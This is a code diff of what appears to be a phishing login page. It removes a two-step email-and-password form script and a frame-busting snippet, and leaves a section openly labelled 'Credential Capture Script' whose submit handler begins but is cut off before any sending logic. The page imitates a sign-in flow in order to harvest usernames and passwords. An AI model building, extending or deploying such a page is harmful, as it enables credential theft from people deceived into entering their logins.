@@ -72,35 +72,8 @@
     </div>
   </div>
 
-  <!-- UI Scripts -->
-  <script>
-    const forms = document.querySelector(".forms");
-    const nextButton = document.querySelector(".next-btn");
-    const arrowButton = document.querySelector(".arrow-btn");
-
-    const emailInput = document.querySelector('.first input[name="UsernameForm"]');
-    const emailDisplay = document.querySelector(".email");
-    const passwordInput = document.querySelector('.second input[name="password"]');
-
-    nextButton.addEventListener("click", () => {
-      forms.classList.add("next-form");
-      emailDisplay.innerText = emailInput.value;
-      passwordInput.setAttribute("placeholder", "Password for " + emailInput.value);
-      document.querySelector(".bottom").style.display = "none";
-    });
-
-    arrowButton.addEventListener("click", () => {
-      forms.classList.remove("next-form");
-      document.querySelector(".bottom").style.display = "flex";
-    });
-  </script>
-
   <!-- Credential Capture Script -->
   <script>
-    if (self !== top) {
-      top.location = self.location;
-    }
-
     let submitted = false;
     function handleSubmit(event) {
       event.preventDefault();
